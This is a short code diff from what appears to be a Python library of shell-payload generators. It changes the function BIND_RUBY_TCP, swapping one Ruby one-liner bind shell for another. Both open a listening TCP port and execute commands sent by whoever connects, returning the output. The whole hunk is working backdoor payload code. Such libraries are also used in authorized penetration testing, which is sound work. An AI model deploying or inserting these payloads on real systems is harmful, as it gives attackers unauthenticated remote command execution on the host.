@@ -27,7 +27,7 @@ def BIND_PHP_UDP():
 
 
 def BIND_RUBY_TCP():
-    return """ruby -rsocket -e 'f=TCPServer.new(PORT);s=f.accept;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",s,s,s)'"""
+    return """ruby -rsocket -e 'f=TCPServer.new(PORT);c=f.accept;f.close();$stdin.reopen(c);$stdout.reopen(c);$stderr.reopen(c);$stdin.each_line{|l|l=l.strip;next if l.length==0;(IO.popen(l,"rb"){|fd| fd.each_line {|o| c.puts(o.strip) }}) rescue nil }'"""
 
 
 def BIND_RUBY_UDP():
